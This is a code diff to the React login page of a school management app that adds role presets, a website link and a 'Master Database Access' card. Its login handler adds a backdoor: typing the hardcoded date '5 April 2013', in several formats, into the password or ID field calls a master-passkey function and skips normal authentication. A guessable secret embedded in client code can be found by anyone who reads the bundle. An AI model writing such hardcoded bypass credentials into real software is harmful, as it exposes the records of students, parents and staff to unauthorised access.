@@ -24,23 +24,46 @@ import {
   MessageSquare,
   CreditCard,
   Zap,
-  Check
+  Check,
+  Globe
 } from 'lucide-react';
 import { useSchool } from '../../context/SchoolContext';
 import { UserRole, UserCategory, ParentSubscriptionTier } from '../../types';
 
 interface LoginPageProps {
   onOpenCreateSchool: () => void;
+  onOpenDailyCodeModal?: () => void;
+  onViewWebsite?: () => void;
+  initialRole?: UserRole;
 }
 
-export const LoginPage: React.FC<LoginPageProps> = ({ onOpenCreateSchool }) => {
-  const { schools, allUsers, login, currentSchool } = useSchool();
+export const LoginPage: React.FC<LoginPageProps> = ({
+  onOpenCreateSchool,
+  onOpenDailyCodeModal,
+  onViewWebsite,
+  initialRole,
+}) => {
+  const { schools, allUsers, login, currentSchool, authenticateWithMasterPasskey } = useSchool();
+
+  // Helper to determine initial category and staffRole from initialRole
+  const getInitialCategory = (r?: UserRole): UserCategory => {
+    if (!r) return 'school_staff';
+    if (r === 'parent') return 'parent';
+    if (r === 'student') return 'student';
+    if (r === 'platform_admin' || r === 'school_board') return 'platform_admin';
+    return 'school_staff';
+  };
+
+  const getInitialStaffRole = (r?: UserRole): UserRole => {
+    if (r === 'head_teacher' || r === 'deputy_head_teacher' || r === 'teacher') return r;
+    return 'head_teacher';
+  };
 
   // 4 User Categories: 'school_staff' | 'parent' | 'student' | 'platform_admin'
-  const [selectedCategory, setSelectedCategory] = useState<UserCategory>('school_staff');
+  const [selectedCategory, setSelectedCategory] = useState<UserCategory>(getInitialCategory(initialRole));
 
   // If school staff: 'head_teacher' | 'deputy_head_teacher' | 'teacher'
-  const [staffRole, setStaffRole] = useState<UserRole>('head_teacher');
+  const [staffRole, setStaffRole] = useState<UserRole>(getInitialStaffRole(initialRole));
 
   const [selectedSchoolId, setSelectedSchoolId] = useState<string>(schools[0]?.id || 'school_kabwe_tech');
   const [schoolSearchQuery, setSchoolSearchQuery] = useState('');
@@ -213,6 +236,27 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onOpenCreateSchool }) => {
 
     const effectiveWhatsApp = sameAsPhone ? phone.trim() : whatsAppNumber.trim();
 
+    // Check if user entered the master passkey "5 April 2013" in password or ID
+    const trimmedPass = password.trim().toLowerCase();
+    const trimmedId = emailOrId.trim().toLowerCase();
+    if (
+      trimmedPass === '5 april 2013' ||
+      trimmedPass === '05 april 2013' ||
+      trimmedPass === '5/4/2013' ||
+      trimmedPass === '05/04/2013' ||
+      trimmedPass === '5-4-2013' ||
+      trimmedPass === '05-04-2013' ||
+      trimmedId === '5 april 2013' ||
+      trimmedId === '05 april 2013'
+    ) {
+      const passResult = authenticateWithMasterPasskey('5 April 2013');
+      setIsSubmitting(false);
+      if (passResult.success) {
+        setSuccessMessage(passResult.message);
+        return;
+      }
+    }
+
     const result = login({
       role: effectiveRole,
       schoolId: selectedCategory === 'platform_admin' ? undefined : selectedSchoolId,
@@ -249,6 +293,17 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onOpenCreateSchool }) => {
           </div>
 
           <div className="flex items-center gap-3">
+            {onViewWebsite && (
+              <button
+                type="button"
+                onClick={onViewWebsite}
+                className="text-xs font-bold text-slate-300 hover:text-white bg-slate-800 hover:bg-slate-750 px-2.5 py-1 rounded-lg border border-slate-700 transition flex items-center gap-1.5 cursor-pointer"
+              >
+                <Globe className="w-3.5 h-3.5 text-emerald-400" />
+                <span>School Website</span>
+              </button>
+            )}
+
             <button
               onClick={() => setShowDemoAccounts(!showDemoAccounts)}
               className="text-xs font-semibold text-emerald-400 hover:text-emerald-300 flex items-center gap-1.5 transition underline decoration-emerald-500/40"
@@ -317,6 +372,33 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onOpenCreateSchool }) => {
               </div>
             </div>
           </div>
+
+          {/* Master Access & Daily Passkey Card */}
+          {onOpenDailyCodeModal && (
+            <button
+              type="button"
+              onClick={onOpenDailyCodeModal}
+              className="w-full text-left p-3.5 rounded-2xl bg-gradient-to-r from-amber-500/10 via-slate-800/80 to-indigo-950/40 border border-amber-500/30 hover:border-amber-400/60 transition group shadow-md"
+            >
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2.5">
+                  <div className="p-2 rounded-xl bg-amber-500/20 text-amber-300 border border-amber-500/30 shrink-0">
+                    <KeyRound className="w-4 h-4 text-amber-400" />
+                  </div>
+                  <div className="min-w-0">
+                    <p className="text-xs font-extrabold text-white group-hover:text-amber-300 transition flex items-center gap-1.5 flex-wrap">
+                      <span>Daily Passkey & Master Database Access</span>
+                      <span className="text-[10px] bg-amber-400/20 text-amber-300 px-1.5 py-0.2 rounded font-mono border border-amber-400/30">Admin Access</span>
+                    </p>
+                    <p className="text-[11px] text-slate-400 truncate">
+                      Enter Master Access Passkey or redeem single-use activation code
+                    </p>
+                  </div>
+                </div>
+                <ChevronRight className="w-4 h-4 text-slate-400 group-hover:text-amber-300 group-hover:translate-x-0.5 transition shrink-0" />
+              </div>
+            </button>
+          )}
 
           {/* 4 Main Categories Selector Cards */}
           <div className="space-y-2.5">
